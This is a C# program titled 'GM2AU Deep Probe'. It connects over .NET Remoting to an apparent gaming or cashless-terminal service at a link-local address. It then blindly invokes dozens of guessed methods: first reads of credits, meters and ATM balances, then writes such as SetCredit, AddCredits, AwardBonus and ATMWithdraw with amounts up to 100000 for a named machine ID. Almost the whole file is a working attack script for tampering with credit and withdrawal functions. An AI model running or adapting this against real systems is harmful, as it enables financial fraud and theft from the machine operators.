using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Http;
using System.Runtime.Remoting.Proxies;

class Program
{
    static void Main(string[] args)
    {
        Console.WriteLine("=== GM2AU Deep Probe ===");
        Console.WriteLine("Timestamp: " + DateTime.Now);

        IDictionary props = new Hashtable();
        props["name"] = "http_probe";
        props["port"] = 0;
        HttpChannel channel = new HttpChannel(props, null, null);
        ChannelServices.RegisterChannel(channel, false);
        Console.WriteLine("[+] HttpChannel registered");

        string url = "http://169.254.243.18:50010/GM2AU";
        Console.WriteLine("[+] Connecting to: " + url);

        object proxy = Activator.GetObject(typeof(MarshalByRefObject), url);

        if (proxy == null)
        {
            Console.WriteLine("[-] Proxy is null");
            return;
        }

        Console.WriteLine("[+] Proxy obtained: " + proxy.GetType().FullName);

        try
        {
            RealProxy rp = RemotingServices.GetRealProxy(proxy);
            Console.WriteLine("[+] RealProxy type: " + rp.GetType().FullName);
            try
            {
                IRemotingTypeInfo rti = (IRemotingTypeInfo)rp;
                Console.WriteLine("[+] IRemotingTypeInfo.TypeName: " + rti.TypeName);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[?] IRemotingTypeInfo failed: " + ex.Message);
            }
            try
            {
                ObjRef objRef = RemotingServices.Marshal((MarshalByRefObject)proxy);
                Console.WriteLine("[+] ObjRef.URI: " + objRef.URI);
                Console.WriteLine("[+] ObjRef.TypeName: " + objRef.TypeInfo.TypeName);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[?] ObjRef failed: " + ex.Message);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[?] RealProxy error: " + ex.Message);
        }

        Type t = proxy.GetType();

        string[] zeroArgMethods = new string[] {
            "GetCredit", "GetBalance", "GetStatus", "GetState", "GetInfo",
            "GetMeters", "GetCashlessBalance", "GetCashlessInfo",
            "GetCredits", "GetGameCredits", "GetSessionCredits",
            "GetTransferAmount", "GetBonusAmount", "GetJackpotAmount",
            "GetWinAmount", "GetBetAmount", "GetCoinIn", "GetCoinOut",
            "GetBillIn", "GetTicketIn", "GetTicketOut", "GetVoucherIn",
            "GetDrop", "GetPaidOut", "GetWon", "GetVersion",
            "GetMachineId", "GetMachineInfo", "GetCabinetId",
            "GetHostStatus", "GetConnectionStatus", "IsConnected",
            "Ping", "Hello", "Test", "Echo", "WhoAmI", "GetServerInfo",
            "GetPendingCommands", "GetPendingTransactions",
            "GetPendingWithdrawals", "GetPendingDeposits",
            "GetATMStatus", "GetATMBalance"
        };

        Console.WriteLine("\n=== TRYING ZERO-ARG METHODS ===");
        foreach (string methodName in zeroArgMethods)
        {
            try
            {
                object result = t.InvokeMember(methodName, BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Instance, null, proxy, new object[0]);
                Console.WriteLine("  [OK] " + methodName + " => " + (result != null ? result.ToString() : "null"));
            }
            catch (TargetInvocationException tie)
            {
                Exception inner = tie.InnerException != null ? tie.InnerException : tie;
                string msg = inner.Message;
                if (msg.Contains("not found") || msg.Contains("missing") || msg.Contains("does not contain") || msg.Contains("Unknown request"))
                {
                }
                else if (msg.Contains("parameter") || msg.Contains("argument") || msg.Contains("count") || msg.Contains("mismatch"))
                {
                    Console.WriteLine("  [ARGS] " + methodName + " => needs args: " + inner.Message);
                }
                else
                {
                    Console.WriteLine("  [CALL] " + methodName + " => " + inner.GetType().Name + ": " + inner.Message);
                }
            }
            catch
            {
            }
        }

        string[] oneIntArgMethods = new string[] {
            "SetCredit", "AddCredit", "SetBalance", "AddBalance",
            "SetCredits", "AddCredits", "SetGameCredits", "AddGameCredits",
            "TransferCredits", "AwardCredits", "CommitCredit",
            "SetTransferAmount", "SetBonusAmount", "AwardBonus",
            "SetJackpotAmount", "SetWinAmount", "SetBetAmount",
            "CommitBet", "CommitWin", "CommitTransfer",
            "ProcessCredit", "ProcessTransfer", "ProcessAward",
            "ProcessWithdrawal", "ProcessDeposit", "ProcessATM",
            "SetMeter", "UpdateMeter", "ResetMeter",
            "CashlessIn", "CashlessOut", "AuthorizeCredit",
            "RequestCredit", "SendCreditUpdate", "ReceiveCreditUpdate",
            "InitializeCredits", "ResetCredits", "EndSession",
            "SaveState", "LoadState", "FlushState",
            "ProcessGameEvent", "HandleCreditEvent",
            "Withdraw", "Deposit", "ATMWithdraw", "ATMDeposit"
        };

        Console.WriteLine("\n=== TRYING ONE-INT-ARG METHODS ===");
        foreach (string methodName in oneIntArgMethods)
        {
            try
            {
                object result = t.InvokeMember(methodName, BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Instance, null, proxy, new object[] { 100 });
                Console.WriteLine("  [OK] " + methodName + "(100) => " + (result != null ? result.ToString() : "null"));
            }
            catch (TargetInvocationException tie)
            {
                Exception inner = tie.InnerException != null ? tie.InnerException : tie;
                string msg = inner.Message;
                if (msg.Contains("not found") || msg.Contains("missing") || msg.Contains("does not contain") || msg.Contains("Unknown request"))
                {
                }
                else if (msg.Contains("parameter") || msg.Contains("argument") || msg.Contains("count") || msg.Contains("mismatch"))
                {
                    Console.WriteLine("  [ARGS] " + methodName + " => needs different args: " + inner.Message);
                }
                else
                {
                    Console.WriteLine("  [CALL] " + methodName + "(100) => " + inner.GetType().Name + ": " + inner.Message);
                }
            }
            catch
            {
            }
        }

        Console.WriteLine("\n=== TRYING STRING+INT METHODS ===");
        string[] twoArgMethods = new string[] {
            "SetCredit", "AddCredit", "TransferCredits", "AwardCredits",
            "CommitCredit", "ProcessCredit", "Withdraw", "Deposit",
            "SetBalance", "AddBalance", "SetCredits", "AddCredits",
            "ProcessWithdrawal", "ProcessDeposit", "ProcessATM",
            "ATMWithdraw", "ATMDeposit", "CashlessIn", "CashlessOut"
        };
        foreach (string methodName in twoArgMethods)
        {
            try
            {
                object result = t.InvokeMember(methodName, BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Instance, null, proxy, new object[] { "GCC_ST_20664_01", 100000 });
                Console.WriteLine("  [OK] " + methodName + "(GCC_ST_20664_01, 100000) => " + (result != null ? result.ToString() : "null"));
            }
            catch (TargetInvocationException tie)
            {
                Exception inner = tie.InnerException != null ? tie.InnerException : tie;
                string msg = inner.Message;
                if (msg.Contains("not found") || msg.Contains("missing") || msg.Contains("does not contain") || msg.Contains("Unknown request"))
                {
                }
                else
                {
                    Console.WriteLine("  [CALL] " + methodName + " => " + inner.GetType().Name + ": " + inner.Message);
                }
            }
            catch
            {
            }
        }

        Console.WriteLine("\n=== PROBE COMPLETE ===");
    }
}
